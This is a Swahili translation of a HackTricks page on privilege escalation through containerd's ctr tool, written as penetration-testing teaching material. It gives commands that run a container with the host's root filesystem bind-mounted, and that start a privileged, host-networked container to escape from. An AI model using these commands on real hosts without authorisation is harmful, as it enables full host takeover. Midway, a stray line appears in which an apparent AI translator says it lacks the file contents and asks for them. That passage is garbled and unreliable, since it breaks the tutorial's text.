# Containerd (ctr) Kuongezeka kwa Vibali

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Go to the following link to learn **where `containerd` and `ctr` fit in the container stack**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

ikiwa utagundua kuwa mashine mwenyeji ina amri ya `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Sina yaliyomo ya faili hiyo hapa. Tafadhali weka yaliyomo ya markdown ya src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md au thibitisha ikiwa ungependa tu orodha ya majina ya picha zilizorejelewa ndani ya faili hiyo. Nitatafsiri kwa Kiswahili baada ya kupata yaliyomo.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Kisha **endesha moja ya images hizo iki-mount folda ya root ya host ndani yake**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Endesha container kwa hali ya privileged na uitoroke kutoka ndani yake.\
Unaweza kuendesha container iliyo privileged kama:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Kisha unaweza kutumia baadhi ya mbinu zilizotajwa kwenye ukurasa ufuatao ili **kutoroka kwa kutumia vibali zenye mamlaka**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
